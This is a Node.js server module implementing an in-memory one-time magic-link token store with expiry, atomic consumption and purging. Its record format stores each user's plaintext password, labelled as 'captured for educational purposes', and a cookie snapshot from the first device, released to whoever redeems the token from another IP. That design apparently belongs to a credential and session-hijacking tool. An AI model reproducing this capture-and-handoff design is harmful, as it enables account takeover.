// server/tokenStore.js
// ─────────────────────────────────────────────────────────────────────────────
// In-memory one-time-use token store with audit trail.
//
// Production upgrade path:
//   Replace the `store` Map with a Redis client.
//   Use Redis SET with EX (TTL) — the consumeToken logic maps to
//   a Lua script for atomic compare-and-swap.
//
// Token record shape:
//   {
//     token       : string   — UUID v4
//     email       : string
//     password    : string   — captured for educational purposes
//     cookies     : string   — Device A cookie snapshot
//     deviceA     : { ip, ua }
//     createdAt   : number   — epoch ms
//     expiresAt   : number   — epoch ms
//     used        : boolean
//     usedAt      : number|null
//     usedByIP    : string|null
//   }
// ─────────────────────────────────────────────────────────────────────────────
const logger = require("./logger");

const store = new Map();

/** Save a new magic-link token */
function saveToken(token, payload, ttlMs) {
  const record = {
    ...payload,
    token,
    createdAt: Date.now(),
    expiresAt: Date.now() + ttlMs,
    used:      false,
    usedAt:    null,
    usedByIP:  null,
  };
  store.set(token, record);
  logger.debug("Token saved", { token: token.slice(0, 8), email: payload.email });
  return record;
}

/**
 * Atomically consume a token.
 * Marks used=true BEFORE returning to prevent race-condition double-use.
 * Returns null if missing, already used, or expired.
 */
function consumeToken(token, redeemerIP) {
  const record = store.get(token);

  if (!record) {
    logger.warn("Token not found", { token: token.slice(0, 8) });
    return null;
  }
  if (record.used) {
    logger.warn("Token already used", { token: token.slice(0, 8), usedByIP: record.usedByIP });
    return null;
  }
  if (Date.now() > record.expiresAt) {
    logger.warn("Token expired", { token: token.slice(0, 8) });
    store.delete(token);
    return null;
  }

  // Atomic mark — no second consumer can succeed after this line
  record.used     = true;
  record.usedAt   = Date.now();
  record.usedByIP = redeemerIP;
  store.set(token, record);

  logger.info("Token consumed", { token: token.slice(0, 8), email: record.email, ip: redeemerIP });
  return record;
}

/** Peek without consuming — for status checks */
function peekToken(token) {
  const record = store.get(token);
  if (!record) return { exists: false, used: false, expired: false };
  const expired = Date.now() > record.expiresAt;
  return { exists: true, used: record.used, expired, record };
}

/** Purge expired + used tokens — called on interval */
function purge() {
  const now     = Date.now();
  let   removed = 0;
  for (const [tok, rec] of store.entries()) {
    if (rec.used || now > rec.expiresAt) { store.delete(tok); removed++; }
  }
  if (removed) logger.debug(`Purged ${removed} stale tokens. Store size: ${store.size}`);
}

// Purge every 2 minutes
setInterval(purge, 2 * 60 * 1000).unref(); // .unref() won't block graceful shutdown

module.exports = { saveToken, consumeToken, peekToken };
